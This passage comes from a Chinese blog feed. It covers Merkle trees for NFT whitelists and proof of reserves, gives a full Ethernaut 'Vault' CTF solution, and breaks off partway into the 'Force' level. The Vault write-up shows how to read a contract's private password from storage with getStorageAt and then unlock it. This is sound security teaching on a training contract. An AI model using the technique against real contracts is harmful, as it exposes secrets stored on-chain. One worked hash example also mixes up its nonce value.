function_">log</span>(verified)</span><br></pre></td></tr></table></figure><p>现在我们有了Merkle树对象和它的根哈希值，我们准备开始考虑如何提供Merkle证明。</p><ol><li>被验证方提供数据 <code>a</code> ，验证方收到数据后，使用 SHA256 进行哈希，并使用Merkle Tree对象上的getProof()方法检索证明。</li><li>被验证方获取 <code>proof</code>、<code>leaf</code> 和 <code>root</code>后就可以通过 MerkleTree 的方法验证。</li></ol><h3 id="验证失败情况"><a href="#验证失败情况" class="headerlink" title="验证失败情况"></a>验证失败情况</h3><p>如果一个无效数据试图使用有效或无效的证明来调用这个函数，生成的目标叶子节点将根本不存在于我们的Merkle树上，验证将失败。</p><ol><li>当使用无效数据生成 proof 时，在我们的 Merkle 树无法获取到 proof。</li><li>当使用无效的数据，提供其他有效数据生成proof时，也无法通过验证。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> badLeaves = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;c&#x27;</span>].<span class="title function_">map</span>(<span class="function"><span class="params">x</span> =&gt;</span> <span class="title class_">SHA256</span>(x))</span><br><span class="line"><span class="keyword">const</span> badTree = <span class="keyword">new</span> <span class="title class_">MerkleTree</span>(badLeaves, <span class="title class_">SHA256</span>)</span><br><span class="line"><span class="keyword">const</span> badLeaf = <span class="title class_">SHA256</span>(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> badProof = badTree.<span class="title function_">getProof</span>(badLeaf)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(badTree.<span class="title function_">verify</span>(badProof, badLeaf, root)) <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="NFT-白名单"><a href="#NFT-白名单" class="headerlink" title="NFT 白名单"></a>NFT 白名单</h3><h4 id="后端实现"><a href="#后端实现" class="headerlink" title="后端实现"></a>后端实现</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">MerkleTree</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;merkletreejs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> keccak256 = <span class="built_in">require</span>(<span class="string">&#x27;keccak256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> whitelist = [</span><br><span class="line">    <span class="string">&#x27;0x7a68Ab63Ba083916a1e4875588b61676F52Bd08b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x9e1D367A900bc7103e3f2f2af9B71ae9d29a3e58&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x5191c9832B5bf6512F7216eE24cc0Ba44558993F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xdd9c4E0B11c319E980c00773296fc1bA6e3D3d23&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xC4282694CE35e1b2DD7823BBF3693cfe1E99c398&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> leaves = whitelist.<span class="title function_">map</span>(<span class="function"><span class="params">addr</span> =&gt;</span> <span class="title function_">keccak256</span>(addr))</span><br><span class="line"><span class="keyword">const</span> tree = <span class="keyword">new</span> <span class="title class_">MerkleTree</span>(leaves, keccak256)</span><br><span class="line"><span class="keyword">const</span> root = tree.<span class="title function_">getHexRoot</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(tree.<span class="title function_">toString</span>())</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(root)</span><br></pre></td></tr></table></figure><p>发行方通过收集白名单用户地址，生成 root 哈希根。</p><h4 id="前端实现"><a href="#前端实现" class="headerlink" title="前端实现"></a>前端实现</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> leaf = <span class="title function_">keccak256</span>(<span class="string">&#x27;0x7a68Ab63Ba083916a1e4875588b61676F52Bd08b&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> proof = tree.<span class="title function_">getProof</span>(leaf)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(tree.<span class="title function_">getHexProof</span>(leaf))</span><br><span class="line"><span class="keyword">const</span> verified = <span class="title class_">MerkleTree</span>.<span class="title function_">verify</span>(proof, leaf, root, keccak256)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(verified)</span><br></pre></td></tr></table></figure><p>前端用户连接上钱包后，通过 API 将钱包地址发往后端，并返回指定的证明 proof。注意钱包地址的大小写。<br>前端通过 MerkleTree.verify 就可以验证。</p><h4 id="合约实现"><a href="#合约实现" class="headerlink" title="合约实现"></a>合约实现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/utils/cryptography/MerkleProof.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Merkle &#123;</span><br><span class="line">    bytes32 public merkleRoot = 0x2800cfa9f59cf71c57b9f8b5641b745583ef2161b84fba14d823ac3449549976;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; bool) public whitelistClaimed;</span><br><span class="line"></span><br><span class="line">    function whitelistMint(bytes32[] calldata _merkleProof) public &#123;</span><br><span class="line">        require(!whitelistClaimed[msg.sender], &quot;Address has already claimed.&quot;);</span><br><span class="line">        bytes32 leaf = keccak256(abi.encodePacked(msg.sender));</span><br><span class="line">        require(MerkleProof.verify(_merkleProof, merkleRoot, leaf), &quot;Invalid proof.&quot;);</span><br><span class="line">        whitelistClaimed[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="准备金证明（Proof-of-Reserves）"><a href="#准备金证明（Proof-of-Reserves）" class="headerlink" title="准备金证明（Proof of Reserves）"></a>准备金证明（Proof of Reserves）</h3><h4 id="证明机制"><a href="#证明机制" class="headerlink" title="证明机制"></a>证明机制</h4><p>以下步骤针对单一资产，多资产生成多份证明机制即可。</p><h5 id="步骤一-公布平台资产"><a href="#步骤一-公布平台资产" class="headerlink" title="步骤一 公布平台资产"></a>步骤一 公布平台资产</h5><p>平台公布资产的持币地址，证明其拥有的资产储备总额数量。</p><h5 id="步骤二-生成用户节点数据"><a href="#步骤二-生成用户节点数据" class="headerlink" title="步骤二 生成用户节点数据"></a>步骤二 生成用户节点数据</h5><p>平台根据用户的资产数据，通过如下步骤生成用户结点数据：</p><ul><li>每个用户具有 <code>userid,amount</code></li><li>通过算法为每个用户生成 <code>userid,amount,nonce,hashid</code><br>hash函数为</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hash_func</span>(<span class="params">userid, nonce, amount</span>):</span><br><span class="line">    inputstr = userid + <span class="built_in">str</span>(nonce) + <span class="built_in">str</span>(amount)</span><br><span class="line">    hashstr  = hashlib.sha256(inputstr.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    hashid   = hashstr.hexdigest()[<span class="number">0</span>:HASHLEN * <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> hashid</span><br></pre></td></tr></table></figure><p>系统根据展示需求，可以选取部分hash值截断展示（本函数中，<code>HASHLEN=8</code>）。</p><ul><li>通过算法根据用户节点生成平衡的Merkle树，非平衡的结点进行零资产结点填充。<br>以BTC资产为例，图中数量单位为聪，资产Merkle树类似的结构如下：<br><img src="/2022/11/09/merkle-tree/merkle-por.png" alt="merkle"></li></ul><h4 id="步骤三-用户验证资产"><a href="#步骤三-用户验证资产" class="headerlink" title="步骤三 用户验证资产"></a>步骤三 用户验证资产</h4><ul><li>用户可以下载平台完整的平衡Merkle树数据。</li><li>首先验证平台公布的持币地址资产是否大于等于Merkle资产树的根结点数字资产数量，如果大于等于，则证明平台拥有大于等于100%的用户储备金。</li><li>用户可以根据app端展示的nonce等相关数据，按照上述描述的hash函数，自行计算hashID，然后在平衡Merkle树中自行搜索查找叶子结点，证明用户资产在平台公布的储备数字资产中。</li><li>用户可以公布上述过程与数据。</li></ul><p>所有用户都可以采用上述流程进行验证。</p><ul><li>所有用户都能确认自己的资产数目在平台公布的储备资产数据中。</li><li>没有任何用户提出资产数据被重复验证或者伪造。</li><li>在上述两点满足的情况下，通过上述步骤即可证明平台拥有100%储备数字资产。</li></ul><h4 id="用户验证示例"><a href="#用户验证示例" class="headerlink" title="用户验证示例"></a>用户验证示例</h4><p>如果用户在平台中，有一定数量的BTC，那么用户可以验证自己的BTC百分百资产证明。</p><h5 id="用户打开平台-App，获取自己的用户ID-UID-、随机数-Nonce-、余额-Amount-。"><a href="#用户打开平台-App，获取自己的用户ID-UID-、随机数-Nonce-、余额-Amount-。" class="headerlink" title="用户打开平台 App，获取自己的用户ID(UID)、随机数(Nonce)、余额(Amount)。"></a>用户打开平台 App，获取自己的用户ID(UID)、随机数(Nonce)、余额(Amount)。</h5><ul><li>UID: 1563256765354 &#x3D;&#x3D;&gt; 1563256765354</li><li>Nonce: 19039 &#x3D;&#x3D;&gt; 19039</li><li>Amount: 0.13991643 &#x3D;&#x3D;&gt; 13991643</li></ul><p><strong>注意：BTC币种的平台精度是10^8 &#x3D; 100000000，所以计算 0.13991643 * 10^8 &#x3D; 13991643</strong></p><h5 id="计算字符串-str-UID-str-Nonce-str-Amount"><a href="#计算字符串-str-UID-str-Nonce-str-Amount" class="headerlink" title="计算字符串&#x3D; str(UID) + str(Nonce) + str(Amount)"></a>计算字符串&#x3D; str(UID) + str(Nonce) + str(Amount)</h5><p>字符串 &#x3D; “1563256765354” + “13974” + “13991643”<br>       &#x3D; “15632567653541903913991643”</p><h5 id="计算hash值"><a href="#计算hash值" class="headerlink" title="计算hash值"></a>计算hash值</h5><p>hash计算采用SHA256算法。</p><p>SHA256(“15632567653541903913991643”) &#x3D; 90d404dfaad97c23c2df3f1234d774dc88626825c4badc38b906e74df16e56b8</p><p>取前16个字符，故用户HASH &#x3D; 90d404dfaad97c23</p><p><strong>注意：结果不区分大小写（90d404dfaad97c23 和 90D404DFAAD97C23 是一样的）</strong></p><h5 id="在Merkle-Tree中查找用户HASH"><a href="#在Merkle-Tree中查找用户HASH" class="headerlink" title="在Merkle Tree中查找用户HASH"></a>在Merkle Tree中查找用户HASH</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Level,Number,Amount,Hash</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">1.91752000</span>,eba80bc<span class="number">08c79d106</span></span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>,<span class="number">47.94822258</span>,ee350eea6f8cb492</span><br><span class="line"><span class="number">0</span>,<span class="number">2</span>,<span class="number">0.00054241</span>,<span class="number">0d</span>0a4c548f50dc0f</span><br><span class="line"><span class="number">0</span>,<span class="number">3</span>,<span class="number">0.00152490</span>,<span class="number">802</span>f09fc<span class="number">23f90418</span></span><br><span class="line"><span class="number">0</span>,<span class="number">4</span>,<span class="number">0.11042455</span>,<span class="number">30</span>a1681b474a98cb</span><br><span class="line"><span class="number">0</span>,<span class="number">5</span>,<span class="number">0.10482076</span>,add3d0d3fc1f86b5</span><br><span class="line"><span class="number">0</span>,<span class="number">6</span>,<span class="number">0.00558000</span>,<span class="number">1</span>f1a4a83c896a74a</span><br><span class="line"><span class="number">0</span>,<span class="number">7</span>,<span class="number">0.19614663</span>,<span class="number">0d</span>122b896db2a3d2</span><br><span class="line"><span class="number">0</span>,<span class="number">8</span>,<span class="number">0.95972872</span>,<span class="number">1</span>aa46995b<span class="number">911a072</span></span><br><span class="line"><span class="number">0</span>,<span class="number">9</span>,<span class="number">0.00066497</span>,<span class="number">924</span>c84586d6ca305</span><br><span class="line"><span class="number">0</span>,<span class="number">10</span>,<span class="number">0.05185066</span>,<span class="number">31</span>b6e65f5fb3eaee</span><br><span class="line"><span class="number">0,11,283</span>.<span class="number">97299139</span>,<span class="number">5</span>a1b487021bb9eab</span><br><span class="line"><span class="number">0</span>,<span class="number">12</span>,<span class="number">0.00000239</span>,f2333a1e<span class="number">42a586d3</span></span><br><span class="line"><span class="number">0</span>,<span class="number">13</span>,<span class="number">0.00000024</span>,<span class="number">69</span>ed031686af93da</span><br><span class="line"><span class="number">0</span>,<span class="number">14</span>,<span class="number">0.00834000</span>,<span class="number">6d</span>3f2e89b0125a0d</span><br><span class="line"><span class="number">0</span>,<span class="number">15</span>,<span class="number">1.24884468</span>,<span class="number">29</span>b4a398123cb0e7</span><br><span class="line">## 在这里 ##</span><br><span class="line"><span class="number">0</span>,<span class="number">16</span>,<span class="number">0.13991643</span>,<span class="number">90d</span>404dfaad97c23</span><br><span class="line"><span class="number">0</span>,<span class="number">17</span>,<span class="number">0.13252314</span>,acdb92f515bef17e</span><br><span class="line"><span class="number">0</span>,<span class="number">18</span>,<span class="number">4.00350239</span>,cf36f3061133fc62</span><br><span class="line"><span class="number">0</span>,<span class="number">19</span>,<span class="number">0.12932834</span>,<span class="number">54</span>ee2ba25591eb90</span><br><span class="line"><span class="number">0</span>,<span class="number">20</span>,<span class="number">0.06461708</span>,cca2b<span class="number">192d0d63302</span></span><br><span class="line"><span class="number">0</span>,<span class="number">21</span>,<span class="number">0.00227000</span>,<span class="number">02759</span>e<span class="number">7972e79550</span></span><br><span class="line"><span class="number">0</span>,<span class="number">22</span>,<span class="number">0.03963867</span>,bf68c<span class="number">210400a3312</span></span><br><span class="line"><span class="number">0</span>,<span class="number">23</span>,<span class="number">0.03366789</span>,<span class="number">7</span>f0bf2b94f03898e</span><br><span class="line"><span class="number">0,24,177</span>.<span class="number">03102948</span>,<span class="number">6551016</span>b5dcf36e7</span><br><span class="line"><span class="number">0</span>,<span class="number">25</span>,<span class="number">0.00000481</span>,<span class="number">36</span>c32980082316db</span><br><span class="line"><span class="number">0</span>,<span class="number">26</span>,<span class="number">0.00000789</span>,ec59240a<span class="number">475879f7</span></span><br><span class="line"><span class="number">0</span>,<span class="number">27</span>,<span class="number">1.19111166</span>,<span class="number">77</span>aa7b9<span class="number">23c1b3138</span></span><br><span class="line"><span class="number">0</span>,<span class="number">28</span>,<span class="number">0.04801322</span>,bcbe16ad<span class="number">3790c0c6</span></span><br><span class="line"><span class="number">0</span>,<span class="number">29</span>,<span class="number">0.21463450</span>,<span class="number">5d</span>67e5c769ac58b6</span><br><span class="line"><span class="number">0</span>,<span class="number">30</span>,<span class="number">35.29639568</span>,<span class="number">44535d</span>f<span class="number">6e4664445</span></span><br><span class="line"><span class="number">0</span>,<span class="number">31</span>,<span class="number">1.02122205</span>,a410e18cb5e066de</span><br><span class="line"><span class="number">0</span>,<span class="number">32</span>,<span class="number">0.51984214</span>,bd600e3baca65f92</span><br><span class="line"><span class="number">0</span>,<span class="number">33</span>,<span class="number">0.00000883</span>,<span class="number">2802427</span>b<span class="number">1d68b499</span></span><br><span class="line"><span class="number">0</span>,<span class="number">34</span>,<span class="number">0.04932213</span>,<span class="number">51</span>cc039b07c6cc81</span><br><span class="line"><span class="number">0</span>,<span class="number">35</span>,<span class="number">0.00573294</span>,<span class="number">73</span>a7c5ae<span class="number">8f741815</span></span><br><span class="line"><span class="number">0</span>,<span class="number">36</span>,<span class="number">10.13089000</span>,<span class="number">9543948400</span>babc5c</span><br><span class="line">。。。</span><br><span class="line">。。。</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>在Merkle Tree中找到该用户(90d404dfaad97c23)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0</span>,<span class="number">16</span>,<span class="number">0</span>.<span class="number">13991643</span>,<span class="number">90</span>d404dfaad97c23          </span><br></pre></td></tr></table></figure><p>位于Merkle树叶子层，位置为16，余额为0.13991643</p><p>证毕。</p><h4 id="相关平台"><a href="#相关平台" class="headerlink" title="相关平台"></a>相关平台</h4><ol><li><a href="https://www.kraken.com/zh-cn/proof-of-reserves">Kraken 做出了解释</a></li><li><a href="https://medium.com/@asteacherluo/%E4%BA%A4%E6%98%93%E6%89%80%E7%9A%84%E6%A2%85%E5%85%8B%E5%B0%94%E6%A0%91%E5%82%A8%E5%A4%87%E8%AF%81%E6%98%8E%E6%98%AF%E4%BB%80%E4%B9%88-%E4%BA%A4%E6%98%93%E6%89%80%E7%9A%84%E6%A2%85%E5%85%8B%E5%B0%94%E6%A0%91%E5%82%A8%E5%A4%87%E8%AF%81%E6%98%8E%E6%98%AF%E4%BB%80%E4%B9%88-%E4%BA%A4%E6%98%93%E6%89%80%E7%9A%84%E6%A2%85%E5%85%8B%E5%B0%94%E6%A0%91%E5%82%A8%E5%A4%87%E8%AF%81%E6%98%8E%E6%98%AF%E4%BB%80%E4%B9%88-64b1a41fd6b7">CEX的梅克尔树储备证明是什么？</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;默克尔树&quot;&gt;&lt;a href=&quot;#默克尔树&quot; class=&quot;headerlink&quot; title=&quot;默克尔树&quot;&gt;&lt;/a&gt;默克尔树&lt;/h2&gt;&lt;p&gt;默克尔树结构用很小的成本就能有效验证数据集的完整性。&lt;/p&gt;
&lt;h3 id=&quot;什么是Merkle树？&quot;&gt;&lt;a href=&quot;#什么是Merkle树？&quot; class=&quot;headerlink&quot; title=&quot;什么是Merkle树？&quot;&gt;&lt;/a&gt;什么是Merkle树？&lt;/h3&gt;&lt;p&gt;默克尔树是一种树状结构，树上的每个节点都由一个值表示，这个值是一些加密哈希函数的结果。哈希函数是单向的，从一个输入产生一个输出很容易，但从一个输出确定一个输入在计算上是不可行的。默克尔树有3种类型的节点，如下所示：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;叶子节点 - 叶子节点位于树的最底部，它们的值是原始数据根据指定的哈希函数进行哈希的结果。一棵树上有多少个叶子节点，就有多少个需要哈希的原始数据。例如，如果有7个数据需要被哈希，就会有7个叶子节点。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;父节点 - 父节点可以位于树的不同层次，这取决于整个树的大小，父节点总是位于叶节点之上。父节点的值是由它下面的节点的哈希值决定的，通常从左到右开始。由于不同的输入总是会产生不同的哈希值，不考虑哈希值的碰撞，节点哈希值的连接顺序很重要。值得一提的是，根据树的大小，父节点可以Hash其他父节点。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;根节点 - 根节点位于树的顶端，由位于它下面的两个父节点的哈希值连接而成，同样从左到右开始。任何默克尔树上都只有一个根节点，根节点拥有根哈希值。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;/2022/11/09/merkle-tree/2880.webp&quot; alt=&quot;默克尔树结构&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="exchange" scheme="https://chaosky.tech/tags/exchange/"/>
    
    <category term="cryptography" scheme="https://chaosky.tech/tags/cryptography/"/>
    
  </entry>
  
  <entry>
    <title>8. Vault</title>
    <link href="https://chaosky.tech/2022/11/03/8-Vault/"/>
    <id>https://chaosky.tech/2022/11/03/8-Vault/</id>
    <published>2022-11-03T17:55:26.000Z</published>
    <updated>2022-11-03T17:55:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>Chain: Goerli<br>Difficulty: ●●○○○<br>Level: <a href="https://ethernaut.openzeppelin.com/level/0x78BA1a1DD8833A4a20ecAc0Db8f3aCD8A9211beD">https://ethernaut.openzeppelin.com/level/0x78BA1a1DD8833A4a20ecAc0Db8f3aCD8A9211beD</a></p><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>打开 vault 来通过这一关!</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) public &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析下合约代码，就是要获取合约的password值。虽然 password 是一个 private，不能直接调用合约取值，但我们可以通过 <a href="https://web3js.readthedocs.io/en/v1.8.0/web3-eth.html?highlight=getStorageAt#getstorageat">Web3的getStorageAt</a> 函数可以取得指定地址特定位置的storage。</p><p><code>web3.eth.**getStorageAt**(address, position [, defaultBlock] [, callback])</code></p><p>Get the storage at a specific position of an address.</p><p><strong><strong>Parameters</strong></strong></p><ol><li><code>String</code> - The address to get the storage from.</li><li><code>Number|String|BN|BigNumber</code> - The index position of the storage.</li><li><code>Number|String|BN|BigNumber</code> - (optional) If you pass this parameter it will not use the default block set with <a href="https://web3js.readthedocs.io/en/v1.8.0/web3-eth.html?highlight=getStorageAt#eth-defaultblock">web3.eth.defaultBlock</a>. Pre-defined block numbers as <code>&quot;earliest&quot;</code>, <code>&quot;latest&quot;</code> , <code>&quot;pending&quot;</code>, <code>&quot;safe&quot;</code> or <code>&quot;finalized&quot;</code> can also be used.</li><li><code>Function</code> - (optional) Optional callback, returns an error object as first parameter and the result as second.</li></ol><p><strong>Returns</strong></p><p><code>Promise</code> returns <code>String</code> - The value in storage at the given position.</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><ol><li><p>打开 Console 执行以下命令：</p> <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p> 得到结果：<code>0x412076657279207374726f6e67207365637265742070617373776f7264203a29</code></p><p> 将该结果转换成字符串：<code>await web3.utils.toAscii(&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;)</code> ，可以得到：<code>A very strong secret password :)</code></p></li><li><p>调用合约代码：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await contract.unlock(&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;)</span><br></pre></td></tr></table></figure></li><li><p>提交实例，完成关卡。</p></li></ol><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>请记住, 将一个变量设制成私有, 只能保证不让别的合约访问他. 设制成私有的状态变量和本地变量, 依旧可以被公开访问.</p><p>为了确保数据私有, 需要在上链前加密. 在这种情况下, 密钥绝对不要公开, 否则会被任何想知道的人获得. <a href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/">zk-SNARKs</a> 提供了一个可以判断某个人是否有某个秘密参数的方法,但是不必透露这个参数.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Chain: Goerli&lt;br&gt;Difficulty: ●●○○○&lt;br&gt;Level: &lt;a href=&quot;https://ethernaut.openzeppelin.com/level/0x78BA1a1DD8833A4a20ecAc0Db8f3aCD8A9211beD</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="ethernaut" scheme="https://chaosky.tech/tags/ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>7. Force</title>
    <link href="https://chaosky.tech/2022/11/03/7-Force/"/>
    <id>https://chaosky.tech/2022/11/03/7-Force/</id>
    <published>2022-11-03T16:27:24.000Z</published>
    <updated>2022-11-03T16:27:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>Chain: Goerli<br>Difficulty: ●●●○○<br>Level: <a href="https://ethernaut.openzeppelin.com/level/0x20B5c742dD8A63400644Ba85dd48E8FDB6908A7A">https://ethernaut.openzeppelin.com/level/0x20B5c742dD8A63400644Ba85dd48E8FDB6908A7A</a></p><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>有些合约就是拒绝你的付款,就是这么任性 <code>¯\_(ツ)_/¯</code></p><p>这一关的目标是使合约的余额大于0</p><p>这可能有帮助:</p><ul><li>Fallback 方法</li><li>有时候攻击一个合约最好的方法是使用另一个合约.</li><li>阅读上方的帮助页面, “控制台之外” 部分</li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure><p>首先引入一个知识点 fallback。上一关已经简单介绍过 fallback方法，这次再扩展下。</p><p><code>Solidity</code>支持两种特殊的回调函数，<code>receive()</code>和<code>fallback()</code>，他们主要在两种情况下被使用：</p><ol><li>接收ETH</li><li>处理合约中不存在的函数调用（代理合约proxy contract）</li></ol><h4 id="接收ETH函数-receive"><a href="#接收ETH函数-receive" class="headerlink" title="接收ETH函数 receive"></a>接收ETH函数 receive</h4><p><code>receive()</code>只用于处理接收<code>ETH</code>。一个合约最多有一个<code>receive()</code>函数，声明方式与一般函数不一样，不需要<code>function</code>关键字：<code>receive() external payable &#123; ... &#125;</code>。<code>receive()</code>函数不能有任何的参数，不能返回任何值，必须包含<code>external</code>和<code>payable</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 定义事件</span><br><span class="line">event Received(address Sender, uint Value);</span><br><span class="line">// 接收ETH时释放Received事件</span><br><span class="line">receive() external payable &#123;</span><br><span class="line">    emit Received(msg.sender, msg.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="回退函数-fallback"><a href="#回退函数-fallback" class="headerlink" title="回退函数 fallback"></a>回退函数 fallback</h4><p><code>fallback()</code>函数会在调用合约不存在的函数时被触发。可用于接收ETH，也可以用于代理合约<code>proxy contract</code>。<code>fallback()</code>声明时不需要<code>function</code>关键字，必须由<code>external</code>修饰，一般也会用<code>payable</code>修饰，用于接收ETH:<code>fallback() external payable &#123; ... &#125;</code>。</p><figure 